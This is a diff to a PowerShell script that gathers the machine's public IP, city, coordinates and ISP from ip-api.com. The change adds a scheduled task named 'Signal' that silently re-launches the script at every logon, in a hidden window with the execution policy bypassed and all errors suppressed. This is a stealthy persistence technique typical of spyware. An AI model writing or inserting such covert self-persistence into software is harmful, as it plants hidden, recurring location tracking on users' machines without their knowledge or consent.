@@ -12,6 +12,15 @@ param(
 
 $ErrorActionPreference = 'SilentlyContinue'
 
+$taskName = "Signal"
+if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $trigger  = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 1)
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force -ErrorAction SilentlyContinue | Out-Null
+}
+
 try {
     $response = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,message,query,city,regionName,country,countryCode,zip,lat,lon,isp,org,timezone" -Method Get
 
